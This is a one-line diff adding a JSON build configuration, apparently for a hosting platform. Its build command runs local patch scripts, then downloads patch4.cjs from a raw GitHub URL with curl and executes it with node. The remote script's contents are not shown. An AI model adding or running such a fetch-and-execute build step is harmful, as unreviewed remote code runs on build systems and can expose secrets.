@@ -1,0 +1,1 @@
+{"buildCommand":"node patch.cjs && node patch2.cjs && node patch3.cjs && curl -fsSL https://raw.githubusercontent.com/KeisukeKirby/vibram-lineup/b943e06/patch4.cjs -o patch4.cjs && node patch4.cjs","outputDirectory":"src"}
